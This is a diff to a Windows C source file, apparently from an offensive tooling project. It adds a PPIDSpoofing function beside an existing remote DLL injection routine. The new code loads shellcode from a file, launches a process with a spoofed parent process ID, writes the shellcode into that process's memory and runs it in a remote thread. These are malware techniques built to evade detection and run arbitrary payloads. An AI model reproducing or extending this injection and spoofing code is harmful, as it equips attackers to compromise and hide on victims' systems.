@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <windows.h>
+#include <Shlwapi.h>
 
 #include "Common.h"
 #include "Structs.h"
@@ -100,6 +101,35 @@ BOOL RemoteProcessDllInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, I
 
 	FreeMemory(dwMemoryType, hProcess, pDllPathAddr);
 	CloseHandle(hThread);
+
+	return TRUE;
+}
+
+BOOL PPIDSpoofing(IN LPCSTR lpProcessName, IN LPCSTR lpParentProcessName, IN LPCSTR lpShellcodePath)
+{
+	HANDLE hProcess, hThread;
+	DWORD dwThreadId;
+	PVOID pShellcode, pShellcodeAddr;
+	SIZE_T sShellcodeSize;
+
+	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
+		return FALSE;
+
+	if (!RunPPIDSpoofedProcess(lpProcessName, lpParentProcessName, &hProcess, &hThread))
+		return FALSE;
+
+	if (!AllocateMemory(NULL, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
+		return FALSE;
+
+	if (!RunThread(hProcess, FALSE, pShellcodeAddr, &hThread, &dwThreadId))
+		return FALSE;
+
+	if (!WaitForThread(hThread))
+		return FALSE;
+
+	CloseHandle(hThread);
+	FreeMemory(NULL, hProcess, pShellcodeAddr);
+	LocalFree(pShellcode);
 
 	return TRUE;
 }
